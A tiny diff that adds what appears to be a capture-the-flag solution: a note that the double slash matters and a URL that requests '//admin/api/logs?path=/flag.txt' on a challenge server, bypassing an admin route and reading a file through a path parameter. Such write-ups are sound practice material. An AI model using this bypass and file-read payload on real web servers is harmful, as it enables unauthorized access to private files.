@@ -1,0 +1,3 @@
+note: `//` is critical
+
+http://shortbread.chall.pwnoh.io:13389//admin/api/logs?path=/flag.txt
